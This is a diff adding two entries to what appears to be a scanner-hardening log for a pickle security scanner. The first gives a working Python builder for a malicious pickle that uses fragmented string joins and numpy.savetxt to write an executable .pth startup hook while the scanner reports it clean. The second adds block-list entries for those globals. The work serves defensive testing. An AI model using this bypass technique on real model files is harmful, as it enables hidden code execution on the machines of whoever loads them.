@@ -7079,3 +7079,152 @@ Blocking plan:
 Performance note: exact entries only. The block avoids logger-state
 simulation, stream provenance tracking, message formatting analysis, and
 path/content modeling for `.pth` files.
+
+## Turn 125 - `numpy.savetxt` fragmented `.pth` write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using NumPy's text writer to
+open an attacker-selected `.pth` path and write an attacker-controlled startup
+hook.
+
+Candidate payload:
+
+- Build a `.pth` startup-hook line with `builtins.str.join` from harmless
+  fragments: `"im"`, `"port pathlib;pathlib.Path("`, `repr(marker_path)`,
+  and `").write_text('owned-by-numpy-savetxt')"`.
+- Call `numpy.savetxt(pth_path, [message], "%s")`.
+- Sibling import path: call
+  `numpy.lib._npyio_impl.savetxt(pth_path, [message], "%s")`.
+- Normal Python site processing later executes the line from the `.pth` file.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+def tuple_for(values: list[bytes]) -> bytes:
+    if not values:
+        return b")"
+    if len(values) == 1:
+        return values[0] + b"\x85"
+    if len(values) == 2:
+        return values[0] + values[1] + b"\x86"
+    if len(values) == 3:
+        return values[0] + values[1] + values[2] + b"\x87"
+    return b"(" + b"".join(values) + b"t"
+
+
+pth_path = Path("/tmp/ma_numpy_savetxt_exec.pth")
+marker = Path("/tmp/ma_numpy_savetxt_marker")
+fragments = [
+    "im",
+    "port pathlib;pathlib.Path(",
+    repr(str(marker)),
+    ").write_text('owned-by-numpy-savetxt')",
+]
+
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "str.join"),
+        text(""),
+        tuple_for([text(fragment) for fragment in fragments]),
+        b"\x86R\x94",
+        sg("numpy", "savetxt"),
+        text(str(pth_path)),
+        b"]h\x00a",
+        text("%s"),
+        b"\x87R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 with NumPy 2.4.4:
+
+- Control scanner result: `len=190`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- Control coverage: `bytes_scanned=190`, `bytes_total=190`,
+  `opcode_count=16`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Control import references: `builtins.str.join` with `is_dangerous=False`
+- Control string heuristic matches: `[]`
+- Control runtime: `pickle.loads(control)` returns the assembled startup-hook
+  string; no `.pth` file is created and `site.addsitedir(target_dir)` does not
+  create the marker.
+- RCE scanner result for `numpy.savetxt`: `len=314`,
+  `status=complete`, `verdict=clean`, `is_clean=True`, `findings=[]`,
+  `notices=[]`, `errors=[]`
+- RCE coverage for `numpy.savetxt`: `bytes_scanned=314`,
+  `bytes_total=314`, `opcode_count=25`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- RCE import references for `numpy.savetxt`: `builtins.str.join` and
+  `numpy.savetxt`, both with `is_dangerous=False`
+- RCE string heuristic matches for `numpy.savetxt`: `[]`
+- Before unpickle: no `.pth` file and no marker exists.
+- After `pickle.loads(payload)`: the `.pth` file exists and contains
+  `import pathlib;pathlib.Path('/tmp/.../marker').write_text('owned-by-numpy-savetxt')`;
+  the marker does not exist yet.
+- After normal `site.addsitedir(target_dir)`: the marker exists and contains
+  `owned-by-numpy-savetxt`.
+
+Sibling alias proof:
+
+| Writer global | Scanner verdict | Runtime result |
+| --- | --- | --- |
+| `numpy.savetxt` | clean, 0 findings, 0 notices | `.pth` line executes and writes `owned-by-numpy-savetxt-alias` |
+| `numpy.lib._npyio_impl.savetxt` | clean, 0 findings, 0 notices | `.pth` line executes and writes `owned-by-numpy-savetxt-alias` |
+
+RCE mechanism:
+
+- `numpy.savetxt` opens an attacker-selected path and writes text rows. With a
+  single string row and `fmt="%s"`, the row body is the attacker-controlled
+  `.pth` line.
+- `builtins.str.join` assembles the executable line only at runtime, so no
+  individual pickle string contains an import statement.
+- The internal `numpy.lib._npyio_impl.savetxt` alias reaches the same callable
+  and is importable as a pickle global.
+
+Why the scanner missed it:
+
+- `numpy` is not a wildcard-dangerous module.
+- The policy blocks `numpy.load` and a small number of NumPy execution helpers,
+  but not `numpy.savetxt` or `numpy.lib._npyio_impl.savetxt`.
+- The payload uses no blocked file APIs and no suspicious magic-method names.
+- The payload has complete opcode coverage, no scan errors, no findings, no
+  notices, and no suspicious-string matches.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for `numpy.savetxt` and `numpy.lib._npyio_impl.savetxt`. This keeps
+the hot path to sorted-table lookups and avoids NumPy argument inspection,
+array-shape modeling, path modeling, or broad `numpy` wildcard blocking.
+
+## Turn 126 - Block NumPy `savetxt` text writer dispatch
+
+Blocking plan:
+
+- Add exact dangerous-global entries for `numpy.savetxt` and
+  `numpy.lib._npyio_impl.savetxt`.
+- Add a CPython oracle regression for both Turn 125 writer globals. The
+  control payload only assembles the `.pth` line and remains clean; the active
+  payloads are malicious and still write executable `.pth` content that normal
+  `site.addsitedir()` runs.
+- Skip the NumPy regression when NumPy is unavailable, and skip the internal
+  alias variant when `numpy.lib._npyio_impl` is unavailable in the installed
+  NumPy layout.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: two exact entries in the sorted policy table and no NumPy
+argument inspection, array coercion modeling, path/content analysis, or broad
+`numpy` wildcard block.
